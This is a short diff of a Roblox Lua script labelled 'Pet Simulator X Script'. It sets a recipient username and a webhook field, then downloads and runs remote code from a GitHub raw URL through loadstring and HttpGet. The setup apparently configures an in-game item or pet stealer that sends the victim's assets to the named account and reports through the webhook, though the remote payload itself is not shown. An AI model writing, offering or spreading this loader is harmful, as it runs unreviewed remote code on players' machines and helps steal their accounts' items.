@@ -1,5 +1,5 @@
 _G.UserName = "glentovskii332"
-_G.UserName2 = "HERE" -- optional
-_G.Webhook = "HERR" -- optional
+_G.HubName = "Pet Simulator X Script" -- необязательно
+_G.Webhook = "Здесь"
     
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/LypherXZcript/main/LypherScripts", true))()
